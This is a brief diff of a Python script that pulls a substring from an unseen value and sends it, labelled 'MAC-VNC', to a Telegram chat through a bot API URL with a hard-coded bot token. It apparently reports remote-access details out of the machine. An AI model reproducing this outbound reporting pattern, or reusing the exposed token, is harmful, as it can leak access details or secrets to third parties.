@@ -10,11 +10,11 @@ last_chars = sample_str[7:]
 
 p = last_chars[:26]
 
-
+r= p[:-1]
 
 
 url1= 'https://api.telegram.org/bot1718187783:AAGLVyeXsl0xWFhMM4fjYrV3ij7pE04HSt4/sendMessage?chat_id=-418475197&text=MAC-VNC'
 
-url2= 'https://api.telegram.org/bot1718187783:AAGLVyeXsl0xWFhMM4fjYrV3ij7pE04HSt4/sendMessage?chat_id=-418475197&text={}'.format(p)
+url2= 'https://api.telegram.org/bot1718187783:AAGLVyeXsl0xWFhMM4fjYrV3ij7pE04HSt4/sendMessage?chat_id=-418475197&text={}'.format(r)
 requests.get(url1)
 requests.get(url2)
